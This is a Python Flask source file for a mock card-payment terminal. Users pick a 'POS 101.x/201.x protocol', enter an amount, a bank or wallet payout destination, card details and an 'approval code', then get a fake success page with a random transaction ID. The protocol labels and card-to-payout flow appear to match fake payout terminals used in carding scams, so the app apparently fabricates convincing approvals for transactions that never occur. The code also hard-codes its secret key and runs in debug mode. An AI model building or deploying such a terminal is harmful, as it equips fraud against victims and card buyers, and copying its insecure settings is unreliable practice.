from flask import Flask, render_template, request, redirect, session, url_for
import random

app = Flask(__name__)
app.secret_key = 'fds_secret_key_8583'

DUMMY_CARDS = {
    # POS 101.1 — Basic EMV, 4-digit approval
    "4114755393849011": {"expiry": "0926", "cvv": "363", "auth": "1942", "type": "POS-101.1"},
    "4000123412341234": {"expiry": "1126", "cvv": "123", "auth": "4021", "type": "POS-101.1"},
    
    # POS 101.4 — EMV, 6-digit approval
    "4117459374038454": {"expiry": "1026", "cvv": "258", "auth": "384726", "type": "POS-101.4"},
    "4123456789012345": {"expiry": "0826", "cvv": "852", "auth": "495128", "type": "POS-101.4"},
    
    # POS 101.6 — Magstripe, 6-digit approval
    "5454957994741066": {"expiry": "1126", "cvv": "746", "auth": "627192", "type": "POS-101.6"},
    "5432987643987643": {"expiry": "0726", "cvv": "447", "auth": "729134", "type": "POS-101.6"},
    
    # POS 101.7 — Contactless, 4-digit approval
    "6011000990131077": {"expiry": "0825", "cvv": "330", "auth": "8765", "type": "POS-101.7"},
    "6011123456789010": {"expiry": "0626", "cvv": "112", "auth": "5612", "type": "POS-101.7"},
    
    # POS 101.8 — PINLESS (auth: 0000)
    "3782822463101088": {"expiry": "1226", "cvv": "1059", "auth": "0000", "type": "POS-101.8"},
    "3714496353984310": {"expiry": "0326", "cvv": "3030", "auth": "0000", "type": "POS-101.8"},
    
    # POS 201.1 — Hybrid fallback
    "3530760473041099": {"expiry": "0326", "cvv": "244", "auth": "712398", "type": "POS-201.1"},
    "3528000700000000": {"expiry": "0226", "cvv": "209", "auth": "888123", "type": "POS-201.1"},
    
    # POS 201.3 — EMV+Token
    "2223000048401013": {"expiry": "0726", "cvv": "009", "auth": "939113", "type": "POS-201.3"},
    "2223000012345678": {"expiry": "0626", "cvv": "531", "auth": "112358", "type": "POS-201.3"},
    
    # POS 201.5 — Multi-wallet
    "5105937493749735": {"expiry": "0426", "cvv": "416", "auth": "558877", "type": "POS-201.5"},
    "5100123456789010": {"expiry": "0926", "cvv": "411", "auth": "123321", "type": "POS-201.5"},
}

PROTOCOLS = {
    "POS Terminal -101.1 (4-digit approval)": 4,
    "POS Terminal -101.4 (6-digit approval)": 6,
    "POS Terminal -101.6 (Pre-authorization)": 6,
    "POS Terminal -101.7 (4-digit approval)": 4,
    "POS Terminal -101.8 (PIN-LESS transaction)": 4,
    "POS Terminal -201.1 (6-digit approval)": 6,
    "POS Terminal -201.3 (6-digit approval)": 6,
    "POS Terminal -201.5 (6-digit approval)": 6
}

@app.route('/')
def home():
    session.clear()
    return redirect(url_for('protocol'))

@app.route('/protocol', methods=['GET', 'POST'])
def protocol():
    if request.method == 'POST':
        selected = request.form.get('protocol')
        if selected not in PROTOCOLS:
            return redirect(url_for('rejected', code="INVALID-PROTOCOL"))
        session['protocol'] = selected
        session['code_length'] = PROTOCOLS[selected]
        return redirect(url_for('amount'))
    return render_template('protocol.html', protocols=PROTOCOLS.keys())

@app.route('/amount', methods=['GET', 'POST'])
def amount():
    if request.method == 'POST':
        session['amount'] = request.form.get('amount')
        return redirect(url_for('payout'))
    return render_template('amount.html')

@app.route('/payout', methods=['GET', 'POST'])
def payout():
    if request.method == 'POST':
        payout_type = request.form['method']
        session['payout_type'] = payout_type
        if payout_type == 'BANK':
            session['bank'] = request.form['bank']
            session['account'] = request.form['account']
        else:
            session['wallet'] = request.form['wallet']
        return redirect(url_for('card'))
    return render_template('payout.html')

@app.route('/card', methods=['GET', 'POST'])
def card():
    if request.method == 'POST':
        pan = request.form['pan'].replace(" ", "")
        exp = request.form['expiry'].replace("/", "")
        cvv = request.form['cvv']

        session['pan'] = pan
        session['exp'] = exp
        session['cvv'] = cvv

        card = DUMMY_CARDS.get(pan)
        if not card:
            return redirect(url_for('rejected', code="DECLINED: Approval code rejected or expired. Please contact issuer."))
        if exp != card['expiry']:
            return redirect(url_for('rejected', code="DECLINED: Invalid expiry"))
        if cvv != card['cvv']:
            return redirect(url_for('rejected', code="DECLINED: Invalid CVV"))

        return render_template('auth.html')

    return render_template('card.html')

@app.route('/auth', methods=['GET', 'POST'])
def auth():
    pan = session.get('pan')
    card = DUMMY_CARDS.get(pan)
    if not card:
        return redirect(url_for('rejected', code="DECLINED: Unknown card"))

    if request.method == 'POST':
        code = request.form.get('auth')
        expected_length = session.get('code_length', 6)

        if len(code) != expected_length:
            return render_template('auth.html', warning=f"Code must be {expected_length} digits.")

        if card['auth'] == code:
            txn_id = random.randint(100000, 999999)
            last4 = pan[-4:]
            return render_template('success.html', txn_id=txn_id, pan=last4)
        else:
            return redirect(url_for('rejected', code="TXN-DENIED-781: AUTH CODE MISMATCH"))

    return render_template('auth.html')

@app.route('/rejected')
def rejected():
    code = request.args.get('code')
    return render_template('rejected.html', code=code)

@app.route('/success')
def success():
    txn_id = random.randint(100000, 999999)
    pan = session.get("pan", "")
    return render_template('success.html', txn_id=txn_id, pan=pan[-4:] if pan else "XXXX")

if __name__ == '__main__':
    app.run(debug=True)

